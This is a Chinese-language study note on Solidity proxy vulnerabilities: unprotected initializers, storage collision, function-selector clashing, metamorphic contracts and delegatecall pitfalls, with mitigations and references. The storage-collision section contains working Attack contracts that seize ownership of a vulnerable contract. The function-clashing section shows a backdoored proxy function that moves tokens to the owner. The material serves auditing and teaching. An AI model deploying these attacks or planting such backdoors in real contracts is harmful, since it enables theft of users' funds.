---
title: ProxySecurity
tags:
- Proxy
---
# 1.ProxySecurity

## 1.Unintialized Proxy Vuln

当自动调用合约构造函数时，为什么我们需要`initialize`函数？ 来自OpenZeppelin的解释：合约构造函数中的代码在部署时运行一次，但无法在代理合约的上下文中运行逻辑合约的构造函数代码。由于逻辑合约必须将`_initialized`变量的值存储在代理合约上下文中，因此构造函数不能用于此目的，因为实现合约的构造函数代码将始终在实现合约的上下文中运行。这就是实现合约中存在 `initialize` 函数的原因 - 因为 `initialize` 调用必须通过代理进行。由于初始化调用必须作为实现合约部署的单独步骤进行，因此可能会发生潜在的竞争条件，也应引起注意，例如使用地址控制修饰符保护 `initialize` 函数，以便只有特定的 `msg.sender` 可以初始化该函数。

### Example-1

`Paroty Wallet`:
```solidity
function() payable {
  // just being sent some cash?
  if (msg.value > 0)
    Deposit(msg.sender, msg.value);
  else if (msg.data.length > 0)
_walletLibrary.delegatecall(msg.data);
}
```
该`fallback()`使用`delegatecall`将所有不匹配的函数全部转发到了`library`中，也包括了`initialize`函数.

`Parity Wallet::initWallet()`:
```solidity
// constructor - just pass on the owner array to the multiowned and  // the limit to daylimit  
function initWallet(address[] _owners, uint _required, uint _daylimit) {    
  initDaylimit(_daylimit);    
  initMultiowned(_owners, _required);  
}
```
`initWallet()`没有权限控制，导致所有人都可以调用，攻击者可以轻松的将将`m_owners`状态变量修改成任意地址。

### Example-2
> From:Cyfrin-SecurityCouse-ThunderLoan
```solidity title="OracleUpgradeable.sol"
function __Oracle_init(address poolFactoryAddress) internal onlyInitializing {
        __Oracle_init_unchained(poolFactoryAddress);
    }
```

```solidity title="ThunderLoan.sol"
function initialize(address tswapAddress) external initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
        __Oracle_init(tswapAddress);
        s_feePrecision = 1e18;
        s_flashLoanFee = 3e15; // 0.3% ETH fee
    }
```

### Mitigation
- 在部署期间自动进行初始化。通过在部署期间自动调用初始化函数，开发人员可以降低忘记在部署后手动触发它的风险。这种策略不仅确保在部署合约后立即设置所有合约参数，而且还提供一致的测试和部署流程。

## 2.Storage Collision Vulnerability

当逻辑合约中的slot布局和代理合约中的slot布局不匹配时，就会发生storage冲突，因为代理合约中的delegatecall意味着逻辑合约调用的是代理合约的storage，但是逻辑合约中的变量决定了数据存储的位置，如果他们直接不匹配，他们就会发生冲突。

关于solidity内部存储的详细可以在这里查看:

### Way to Find it
可以使用[sol2num](https://github.com/naddison36/sol2uml),或者[slither[(https://github.com/naddison36/sol2uml),或者是[This](https://github.com/ItsNickBarry/hardhat-storage-layout-diff),或者使用`Foundry`的`inspect`来查看布局.

### Example
Code from Solidity-by-example
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

contract Lib {
    uint256 public someNumber;

    function doSomething(uint256 _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint256 public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}

```
1. Ethernaut Level 6/16/24

## 3.Function Clashing Vulnerability

函数冲突指的是，因为编译后的智能合约采用的是前四个字节作为标识符来识别函数(也就是函数选择器)。当不同名称的函数的哈希前32位相同是，他们有可能回包含相同的selector。编译器会检测到同一个 4 字节函数选择器在单个合约中存在两次，但它不会阻止相同的 4 字节函数选择器存在于项目的不同合约中。

大多数但并非所有代理类型都存在函数冲突。具体来说，UUPS 代理通常不易受到功能冲突的影响，因为实施合约存储了所有自定义功能。

可以使用[这个工具](https://openchain.xyz/signatures)来寻找有相同selector的函数.

### Example
> From Tincho Blog
```solidity
pragma solidity ^0.5.0;

contract Proxy {
    
    address public proxyOwner;
    address public implementation;

    constructor(address implementation) public {
        proxyOwner = msg.sender;
        _setImplementation(implementation);
    }

    modifier onlyProxyOwner() {
        require(msg.sender == proxyOwner);
        _;
    }

    function upgrade(address implementation) external onlyProxyOwner {
        _setImplementation(implementation);
    }

    function _setImplementation(address imp) private {
        implementation = imp;
    }

    function () payable external {
        address impl = implementation;

        assembly {
            calldatacopy(0, 0, calldatasize)
            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)
            returndatacopy(0, 0, returndatasize)

            switch result
            case 0 { revert(0, returndatasize) }
            default { return(0, returndatasize) }
        }
    }
    
    // This is the function we're adding now
    function collate_propagate_storage(bytes16) external {
        implementation.delegatecall(abi.encodeWithSignature(
            "transfer(address,uint256)", proxyOwner, 1000
        ));
    }
}
```
因为：
```solidity
$ pocketh selector "collate_propagate_storage(bytes16)"
0x42966c68

$ pocketh selector "burn(uint256)"
0x42966c68
```
如果一个用户想要调用`burn()`，本来代理合约中没有`burn`函数所以会触发`fallback()`从而执行逻辑合约中的`burn`，但是因为函数选择器相同，所以`EVM`选择了执行`collate_propagate_storage(bytes16)`

### Refer
https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070

https://blog.nomic.foundation/malicious-backdoors-in-ethereum-proxies-62629adf3357

https://proxies.yacademy.dev/pages/security-guide/

## 4.Metamorphic Contract Rug Vulnerability
`CREATE2` 操作码是在君士坦丁堡硬分叉中通过 `EIP-1014` 引入的。与 `CREATE` 操作码不同，它允许将合约部署在可以提前计算的地址。可以部署一个合约，用 `selfdestruct` 销毁合约，然后在与原始合约相同的地址部署一个具有不同代码的新合约。如果用户不知道该地址的代码自最初与合约交互以来发生了变化，他们最终可能会与恶意合约进行交互。计划删除 `EIP-4758` 中的 `selfdestruct` 操作码将消除未来创建变质合约的能力。

### Example
https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614
https://github.com/pcaversaccio/tornado-cash-exploit

## 5.Delegatecall with Selfdestruct Vulnerability
当delegatecall和selfdestruct一起使用的时候，就会出现一些意外。比如当合约A有一个到合约B的delegatecall并且合约B中有selfdestruct的时候，那么合约A会被销毁。

所以如果遇到一个合约具有硬编码目标合约的delegatecall的时候，需要检查目标合约是否包含selfdestruct。如果目标合约不包含 selfdestruct 但包含 delegatecall ，则检查委托给的合约是否有 selfdestruct ，如果目标合约中有 selfdestruct ，则包含 delegatecall 的原始合约可能会被销毁。如果用于 EIP-1167 克隆的主合约被自毁，则从此合约创建的所有克隆都将停止工作。

### Example
1. Ethernaut Level25
2. Paradigm 2021 Vault

### Refer
https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680

## 6.Delegatecall to Arbitrary
`delegatecall` 将执行从代理合约传递到另一个合约，但使用代理合约中的状态变量和上下文（`msg.sender、msg.value`）。如果 `delegatecall` 传递执行的执行合约可以是任意合约，则会出现实质性问题。其一，将 `delegatecall` 与 `selfdestruct` 组合起来可能会导致拒绝服务。另一个风险是，如果用户使用了 `approve` 或设置了允许将包含 `delegatecall` 的代理合约信任到任意地址，则任意 `delegatecall` 目标可能会被用于窃取用户资金。 `delegatecall` 合约将执行转移到的地址必须是受信任的合约，并且不能是开放式的，以允许用户提供要委托的地址。

## 7.Delegatecall external contract missing existence check
当使用 delegatecall 时，不会自动检查外部合约是否存在。如果调用的外部合约不存在，则返回值为 true 。 Solidity 文档中的警告注释中记录了这一点，其中包含以下内容：
> The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.


## Refer
- [yacademy](https://proxies.yacademy.dev/)

- [Do Not Miss These 5 Upgradeability Vulnerabilities](https://www.youtube.com/watch?v=6aPyykZhglM)

- https://medium.com/coinmonks/common-proxy-vulnerabilities-in-solidity-part-1-6068c149075b

- https://medium.com/coinmonks/common-proxy-vulnerabilities-in-solidity-part-2-6bb0c83ba62

- https://twitter.com/jeffsecurity/status/1740675416107712744